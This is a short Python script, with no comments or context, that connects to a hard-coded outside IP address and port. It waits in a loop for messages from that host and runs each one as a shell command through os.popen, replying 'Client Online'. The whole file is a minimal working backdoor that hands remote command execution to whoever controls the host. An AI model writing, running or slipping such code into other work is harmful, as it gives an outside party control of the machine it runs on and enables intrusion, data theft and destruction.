import socket
import os

server = socket.socket()
host = '92.34.183.37'
port = 1234

run = True
server.connect((host,port))
while run:
    msg = server.recv(1024)
    os.popen(msg.decode('UTF-8'))
    server.send('Client Online'.encode('UTF-8'))